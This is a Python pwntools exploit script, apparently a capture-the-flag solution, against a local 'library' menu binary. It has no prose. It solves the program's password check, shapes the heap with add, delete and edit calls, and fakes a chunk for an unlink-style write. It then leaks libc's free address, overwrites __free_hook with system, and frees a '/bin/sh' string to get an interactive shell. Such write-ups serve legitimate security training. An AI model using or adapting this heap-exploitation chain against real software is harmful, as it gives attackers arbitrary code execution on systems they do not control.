from pwn import *
#p=process(['./library'],env={'LD_PRELOAD':'./libc.so.6'})
p = remote("127.0.0.1", 8888)
libc=ELF('./libc.so.6')
def cal(cipher):
	key=[61, 73, 83, 97, 109, 113, 127, 131, 137, 139, 149, 151, 167, 179, 193, 199, 211, 223, 229]
	keyposs=[[] for i in range(4)]
	for i in range(0xa3):
		ciphermid=cipher+(i<<32)
		for j in range(4):
			for k in key:
				if ciphermid % k == 0:
					ciphermid=ciphermid//k
					break
		if ciphermid in range(64,263):
			cipher=ciphermid
			break
	return cipher
def new(a,b):
    p.writeline('1')
    p.readuntil('Index:')
    p.writeline(str(a))
    p.readuntil('the book:')
    p.writeline(b)
    p.readuntil('>>')
def dele(a):
    p.writeline('4')
    p.readuntil('Index:')
    p.writeline(str(a))
    p.readuntil('>>')
def edit(a,b):
    p.writeline('2')
    p.readuntil('Index:')
    p.writeline(str(a))
    p.readuntil('new name of the book:')
    p.writeline(b)
    p.readuntil('>>')
#context(log_level='debug')
#gdb.attach(p)
for i in range(4):
	cipher=p.recv()[:-1]
	cipher=int(cipher,16)
	password=cal(cipher)
	p.sendline(str(password))
p.readuntil('>>')
new(1,p64(0x31)*3+chr(0x31))
new(2,'')
new(3,'')
new(4,p64(0x31)*3)
new(5,'')
new(6,'')
new(7,'')
dele(2)
dele(3)
p.writeline('3')
p.readuntil('Index:')
p.writeline('3')
heap=u64((p.readuntil('\n')[:-1]).ljust(8,chr(0x0)))-0x30
print hex(heap)
edit(3,p64(heap+0xa0))


payload=p64(0x90)*3+chr(0x90)
new(8,'')
edit(4,p64(0x31)*2+p64(heap+0x20))

new(0,payload)

payload=p64(0x0)+p64(0x91)+p64(0x4040a8-0x18)+p32(0x4040a8-0x10)
new(9,payload)

dele(5)
# gdb.attach(p,'b *0x401513')
edit(9,p64(0x404040)+p64(0x403f90)+p64(0x404090))

edit(6,p64(0xff))
p.writeline('3')
p.readuntil('Index:')
p.writeline('7')
free_addr=u64((p.readuntil('\n')[:-1]).ljust(8,chr(0x0)))
free_hook=free_addr+libc.symbols['__free_hook']-libc.symbols['free']
system=(free_addr+libc.symbols['system']-libc.symbols['free'])
edit(8,p64(free_hook))

edit(6,p64(system))

edit(1,'/bin/sh\x00')

p.writeline('4')
p.readuntil('Index:')
p.writeline('1')

p.interactive()
p.close()
